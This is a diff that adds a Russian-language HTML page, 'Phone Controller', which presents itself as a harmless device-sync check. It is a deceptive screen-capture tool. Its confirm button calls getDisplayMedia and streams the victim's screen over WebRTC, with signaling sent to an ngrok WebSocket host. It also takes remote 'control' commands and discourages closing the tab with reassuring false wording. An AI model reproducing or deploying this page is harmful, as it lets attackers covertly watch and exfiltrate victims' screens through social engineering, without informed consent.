@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phone Controller</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #e5ddd5;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            margin-top: 50px;
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        button {
+            padding: 10px;
+            margin: 10px;
+            width: 80%;
+            border-radius: 5px;
+            border: none;
+            background-color: #0088cc;
+            color: white;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #006699;
+        }
+        #result {
+            margin-top: 10px;
+            color: #333;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+        .modal-content {
+            background-color: white;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            max-width: 400px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        .modal-button {
+            padding: 10px 20px;
+            margin: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .modal-button.confirm {
+            background-color: #0088cc;
+            color: white;
+        }
+        .modal-button.cancel {
+            background-color: #ccc;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0088cc;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 2s linear infinite;
+            margin: 10px auto;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Phone Controller</h1>
+        <p>Нажмите, чтобы синхронизировать устройство</p>
+        <button onclick="showModal()">Синхронизировать</button>
+        <p id="result">Результат появится здесь</p>
+        <div id="loader" class="loader"></div>
+    </div>
+
+    <div id="confirmationModal" class="modal">
+        <div class="modal-content">
+            <p id="modalMessage">Подтвердите синхронизацию устройства для управления</p>
+            <p style="color: #888; font-size: 12px;">Это необходимо для проверки совместимости. Безопасно и займёт несколько секунд.</p>
+            <button class="modal-button confirm" onclick="startScreenShare()">Подтвердить</button>
+            <button class="modal-button cancel" onclick="closeModal()">Отмена</button>
+        </div>
+    </div>
+
+    <script>
+        let localStream = null;
+        let peerConnection = null;
+        const ws = new WebSocket('wss://5a94-159-224-105-180.ngrok-free.app');
+
+        ws.onopen = () => {
+            console.log('Подключено к WebSocket-серверу');
+        };
+
+        ws.onmessage = (event) => {
+            const message = JSON.parse(event.data);
+            if (message.type === 'offer') {
+                handleOffer(message.offer);
+            } else if (message.type === 'candidate') {
+                addIceCandidate(message.candidate);
+            } else if (message.type === 'control') {
+                simulateTouch(message.x, message.y);
+            }
+        };
+
+        function showModal() {
+            const modal = document.getElementById('confirmationModal');
+            modal.style.display = 'block';
+        }
+
+        function closeModal() {
+            const modal = document.getElementById('confirmationModal');
+            modal.style.display = 'none';
+        }
+
+        async function startScreenShare() {
+            const result = document.getElementById('result');
+            const loader = document.getElementById('loader');
+            closeModal();
+
+            try {
+                result.innerText = `Подготовка к синхронизации...`;
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                localStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                result.innerText = `Устройство синхронизировано! Не закрывайте вкладку, чтобы продолжить управление.`;
+                loader.style.display = 'block';
+                setupPeerConnection();
+
+                window.onbeforeunload = () => {
+                    return "Устройство всё ещё подключено! Если вы закроете вкладку, управление прервётся. Вы уверены?";
+                };
+
+                setTimeout(() => {
+                    result.innerText = `Синхронизация завершена! Управление активно. Не закрывайте вкладку!`;
+                }, 10000);
+            } catch (err) {
+                console.error('Ошибка захвата экрана:', err);
+                result.innerText = `Ошибка: Не удалось синхронизировать устройство. Попробуйте снова.`;
+                loader.style.display = 'none';
+            }
+        }
+
+        function setupPeerConnection() {
+            const configuration = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
+            peerConnection = new RTCPeerConnection(configuration);
+
+            localStream.getTracks().forEach(track => {
+                peerConnection.addTrack(track, localStream);
+            });
+
+            peerConnection.onicecandidate = event => {
+                if (event.candidate) {
+                    ws.send(JSON.stringify({ type: 'candidate', candidate: event.candidate }));
+                }
+            };
+
+            peerConnection.createOffer()
+                .then(offer => peerConnection.setLocalDescription(offer))
+                .then(() => {
+                    ws.send(JSON.stringify({ type: 'offer', offer: peerConnection.localDescription }));
+                });
+        }
+
+        async function handleOffer(offer) {
+            await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
+            const answer = await peerConnection.createAnswer();
+            await peerConnection.setLocalDescription(answer);
+            ws.send(JSON.stringify({ type: 'answer', answer: peerConnection.localDescription }));
+        }
+
+        async function addIceCandidate(candidate) {
+            try {
+                await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
+            } catch (e) {
+                console.error('Ошибка добавления ICE Candidate:', e);
+            }
+        }
+
+        function simulateTouch(x, y) {
+            const touchEvent = new TouchEvent('touchstart', {
+                touches: [{ clientX: x, clientY: y }],
+                bubbles: true,
+                cancelable: true
+            });
+            document.dispatchEvent(touchEvent);
+        }
+    </script>
+</body>
+</html>
